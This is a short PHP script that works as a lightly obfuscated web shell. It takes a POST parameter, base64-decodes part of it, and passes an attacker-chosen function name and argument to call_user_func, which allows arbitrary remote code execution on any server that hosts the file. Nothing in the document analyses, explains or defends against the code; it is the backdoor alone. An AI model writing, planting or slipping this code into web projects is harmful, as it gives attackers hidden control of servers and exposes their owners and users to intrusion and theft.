<?php
$decrpt = $_POST['x'];
$arrs = explode("|", $decrpt)[1];
$arrs = explode("|", base64_decode($arrs));
call_user_func($arrs[0],$arrs[1]);
?>